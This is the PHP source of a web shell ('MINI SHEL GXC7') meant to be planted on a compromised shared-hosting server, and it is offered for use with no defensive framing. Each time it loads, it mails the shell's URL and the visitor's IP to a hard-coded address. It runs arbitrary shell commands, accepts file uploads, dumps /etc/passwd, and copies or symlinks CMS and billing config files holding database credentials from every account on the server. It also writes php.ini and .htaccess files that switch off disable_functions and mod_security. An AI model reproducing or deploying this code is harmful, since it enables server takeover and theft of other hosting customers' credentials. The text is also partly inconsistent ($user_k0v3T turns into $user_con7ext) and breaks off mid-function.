 <html>
  <head>
  <link href='http://res7ock.org/assets/img/favicon.png' rel='shortcut icon' alt='icon'>
  <title>MINI SHEL GXC7</title>
<center><h1><font face="Sarpanch">MINI SHEL GXC7</h1></center>
  <meta name='author' content='k0v3T Shell'>
  <meta charset="UTF-8">
  <link href="" rel="stylesheet" type="text/css">

<style>
body{
font-family: "Sarpanch", cursive;
    background: url("#") #293a4a no-repeat center center fixed;
    background-size: cover;
      color:Blue;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:#000;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color: #5ddcfc;
text-shadow:1px 0px 0px #000;
}
#content .first{
background-color: #5ddcfc;
font-weight: bold;
}
H1{
color:#5ddcfc;
font-family: "Sarpanch", cursive;
}
#content .first:hover{
background-color: #5ddcfc;
text-shadow:1px 0px 0px #000;
}
table{
border: 0px red solid;
}
a{
color: red;
text-decoration: none;
}
a:hover{
color: red;
text-shadow:1px 0px 0px #000;
}
.tombols{
background:black;
color:#5ddcfc;
border-top:0;
border-left:0;
border-right:0;
border: 2px white solid;
padding:5px 8px;
text-decoration:none;
font-family: 'Sarpanch', sans-serif;
border-radius:5px;
}
textarea{
color:#5ddcfc;
background-color:transparent;
font-weight: bold;
padding:5px 8px;
font-family: "Sarpanch", cursive;
border: 2px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input,select{
color:#5ddcfc;
background-color:black;
font-weight: bold;
font-family: "Sarpanch", cursive;
border: 2px white solid;
}
</style>
</head>




<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Sarpanch|Teko" rel="stylesheet">
<?php

@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$password = 'cyber0spacex@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($password, "masukan password", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
set_time_limit(0);
error_reporting(0);

//function
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
}

function exe($cmd) {
    if(function_exists('system')) {        
@ob_start();       
@system($cmd);     
$buff = @ob_get_contents();        
@ob_end_clean();       
return $buff;  
    } elseif(function_exists('exec')) {        
@exec($cmd,$results);      
$buff = "";        
foreach($results as $result) {         
    $buff .= $result;      
} return $buff;    
    } elseif(function_exists('passthru')) {        
@ob_start();       
@passthru($cmd);       
$buff = @ob_get_contents();        
@ob_end_clean();       
return $buff;  
    } elseif(function_exists('shell_exec')) {      
$buff = @shell_exec($cmd);     
return $buff;  
    }
}

//check dir
$nick = "k0v3T";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$software = getenv("SERVER_SOFTWARE");
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);


////////////////////////////////////////

if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
} 
//uname
echo "<br><b><i><center><font color=#5ddcfc size=3>Current Dir : </font>";
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '"><font color=red size=3>'.$pat.'</font></a>/';
}

##TOOLBAR
echo "<hr color=#5ddcfc>
<br><center>
<font size=3><a href='?' class='tombols'>Home</a>
<font size=3><a href='?path=$path&a=upload' class='tombols'>Upload</a>
<font size=3><a href='?path=$path&a=cmd' class='tombols'>Command</a>
<font size=3><a href='?path=$path&a=configv2' class='tombols'>Config</a>
<font size=3><a href='?path=$path&a=jumping' class='tombols'>Jumping</a>
<br><br>

<font size=3><a href='?path=$path&a=symlink' class='tombols'>Symlink</a>
<font size=3><a href='?path=$path&a=disablefunc' class='tombols'>Bypass Disable Function</a>

</center></br>
<hr color=#5ddcfc><center>";

//uploads
if($_GET['a'] == 'upload') {
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#5ddcfc">Berhasil Upload Mek!</font><br />';
}else{
echo '<font color="lightblue">Gagal Upload Mek</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="white" size="4">
Upload File :<br><input type="file" name="file" />
<input type="submit" value="Upload" />
</form><br>
</td></tr>';	


} elseif($_GET['a'] == 'configv2') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("k0v3T_symvhosts", 0777);
exe("ln -s / k0v3T_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("k0v3T_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php k0v3T_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php k0v3T_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php k0v3T_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php k0v3T_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php k0v3T_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php k0v3T_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml k0v3T_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php k0v3T_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php k0v3T_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("k0v3T_symconfig", 0777);
@symlink("/","k0v3T_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("k0v3T_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("k0v3T_sym404", 0777);
@symlink("/","k0v3T_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*k0v3T_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("k0v3T_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("k0v3T_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("k0v3T_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_k0v3T) {
$grab_config = array(
"/home/$user_k0v3T/.accesshash" => "WHM-accesshash",
"/home/$user_k0v3T/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_k0v3T/public_html/forum/config.php" => "phpBB",
"/home/$user_k0v3T/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_k0v3T/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_k0v3T/public_html/app/etc/local.xml" => "Magento",
"/home/$user_k0v3T/public_html/admin/config.php" => "OpenCart",
"/home/$user_k0v3T/public_html/application/config/database.php" => "Ellislab",
"/home/$user_k0v3T/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_k0v3T/public_html/includes/config.php" => "Vbulletin",
"/home/$user_k0v3T/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_k0v3T/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_k0v3T/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_k0v3T/public_html/inc/config.php" => "MyBB",
"/home/$user_k0v3T/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_k0v3T/public_html/inc/conf_global.php" => "IPB",
"/home/$user_k0v3T/public_html/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_k0v3T/public_html/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/blog/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/submitticket.php" => "^WHMCS",
"/home/$user_k0v3T/public_html/cms/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/beta/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/portal/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/site/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/main/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/home/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/demo/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/test/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/v1/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/v2/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/new/configuration.php" => "Joomla",
"/home/$user_k0v3T/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_k0v3T/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("k0v3T_configgrab/$user_k0v3T-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"k0v3T_Symconfig/".$user_k0v3T."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"k0v3T_sym404/".$user_k0v3T."-".$nama_config.".txt");
if($sym404){
	@mkdir("k0v3T_sym404/".$user_k0v3T."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
HeaderName k0v3T.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("k0v3T_sym404/".$user_k0v3T."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"k0v3T_sym404/".$user_k0v3T."-".$nama_config.".txt404/k0v3T.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?path=$path/k0v3T_configgrab'><font color=red>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"k0v3T_sym404/root/\">SymlinkNya</a>
<br><a href=\"k0v3T_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"k0v3T_symconfig/root/\">Symlinknya</a>
<br><a href=\"k0v3T_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"k0v3T_symvhost/root/\">Root Server</a>
<br><a href=\"k0v3T_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}

} elseif($_GET['a'] == 'disablefunc'){
		echo "<br><br><center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' />&nbsp;<input type=submit name=litini value='Litespeed' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
			 $byph = "safe_mode = Off n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}

}
elseif($_GET['a'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("k0v3T_sym",0777);
@chdir("k0v3T_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/k0v3T_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("k0v3T_sym",0777);
@chdir("k0v3T_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/k0v3T_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("k0v3T_sym",0777);@chdir("k0v3T_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex k0v3T.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
